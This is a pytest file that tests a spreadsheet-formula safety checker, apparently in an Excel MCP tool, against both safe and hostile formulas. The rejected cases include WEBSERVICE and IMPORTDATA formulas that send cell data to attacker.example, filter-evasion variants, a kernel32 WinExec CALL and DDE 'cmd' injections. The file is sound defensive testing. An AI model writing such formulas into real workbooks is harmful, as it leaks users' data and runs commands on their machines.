import pytest

from excel_mcp.errors import UnsafeFormulaError
from excel_mcp.formulas import check_formula


@pytest.mark.parametrize(
    "formula",
    [
        "=SUM(A1:A10)",
        "=IF(B2>0,B2*1.2,0)",
        "=_xlfn.XLOOKUP(A2,Sheet2!A:A,Sheet2!B:B)",
        "=SUM(Table1[Sales])",
        "=Table1[[#This Row],[Units]]*2",
        "='My Sheet'!A1+1",
        '="a|b"&A1',
        '=CONCAT("see ","https://example.com")',
        "=LET(x,A1*2,x+1)",
    ],
)
def test_safe_formulas_are_accepted(formula: str) -> None:
    check_formula(formula)


@pytest.mark.parametrize(
    "formula",
    [
        '=WEBSERVICE("https://attacker.example/?d="&A1)',
        '=webservice("https://attacker.example")',
        '=WebService("https://attacker.example")',
        '=_xlfn.WEBSERVICE("https://attacker.example")',
        '=FILTERXML(WEBSERVICE("https://x"),"//a")',
        '=HYPERLINK("https://phish.example","Click")',
        '=IMAGE("https://tracker.example/pixel.png")',
        '=INDIRECT("A"&B1)',
        '=RTD("server",,"topic")',
        '=CALL("kernel32","WinExec","JCJ","calc",0)',
        '=INFO("directory")',
        "=SUM(IF(A1>0,WEBSERVICE(B1),0))",
        '=webservice ("https://attacker.example")',
        '=_xlfn.WEBSERVICE ("https://attacker.example")',
        '=IMPORTXML("https://attacker.example","//a")',
        '=importdata("https://attacker.example/?d="&A1)',
        '=@WEBSERVICE("https://attacker.example")',
        '=@_xlfn.IMAGE("https://attacker.example/p.png")',
        '=_xlfn._xlfn.WEBSERVICE("https://attacker.example")',
        '=_xlfn.MAP("https://attacker.example",_xleta.WEBSERVICE)',
        '=Sheet1!WEBSERVICE("https://attacker.example")',
        '=CELL("filename",A1)',
    ],
)
def test_dangerous_functions_are_rejected(formula: str) -> None:
    with pytest.raises(UnsafeFormulaError, match="not allowed"):
        check_formula(formula)


@pytest.mark.parametrize(
    "formula",
    [
        "=[1]Sheet1!A1",
        "='C:\\data\\[secrets.xlsx]Sheet1'!A1",
        "=SUM([book.xlsx]Sheet1!A1:A3)",
    ],
)
def test_external_workbook_references_are_rejected(formula: str) -> None:
    with pytest.raises(UnsafeFormulaError, match="other workbooks"):
        check_formula(formula)


@pytest.mark.parametrize("formula", ["=cmd|' /C calc'!A0", "=cmd|'/c calc'!'A0'"])
def test_dde_is_rejected(formula: str) -> None:
    with pytest.raises(UnsafeFormulaError):
        check_formula(formula)


def test_formula_must_start_with_equals() -> None:
    with pytest.raises(UnsafeFormulaError, match="start with"):
        check_formula("SUM(A1)")
